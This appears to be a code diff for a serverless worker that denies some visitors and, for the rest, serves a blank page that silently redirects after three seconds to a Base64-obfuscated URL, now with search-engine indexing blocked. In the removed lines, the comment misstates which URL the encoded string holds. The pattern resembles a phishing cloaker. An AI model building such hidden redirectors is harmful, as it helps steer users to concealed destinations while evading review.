@@ -14,13 +14,11 @@ export default {
       return new Response("Access denied", { status: 403 });
     }
 
-    // === Target URL encoded in Base64 ===
-    const targetBase64 = "aHR0cHM6Ly9yZW5la2l0emVuLmNvbS93ZWJhcHAuaHRtbA=="; // Base64 of https://myshop.app
-
-    // Decode Base64
+    // === Target URL in Base64 ===
+    const targetBase64 = "aHR0cHM6Ly9teXNob3AuYXBw";   // https://myshop.app
     const targetUrl = atob(targetBase64);
 
-    // HTML that redirects silently after 3 seconds
+    // === Clean HTML with embedded JS ===
     const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -28,12 +26,18 @@ export default {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <style>
-        body { background: #ffffff; margin: 0; padding: 0; overflow: hidden; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
     </style>
 </head>
 <body>
+    <!-- JavaScript for redirect -->
     <script>
-        // Redirect after 3 seconds
+        // Redirect to target after 3 seconds
         setTimeout(() => {
             window.location.href = "${targetUrl}";
         }, 3000);
@@ -44,7 +48,8 @@ export default {
     return new Response(html, {
       headers: {
         "Content-Type": "text/html;charset=UTF-8",
-        "Cache-Control": "no-store, no-cache, must-revalidate",
+        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+        "X-Robots-Tag": "noindex, nofollow"
       },
     });
   },
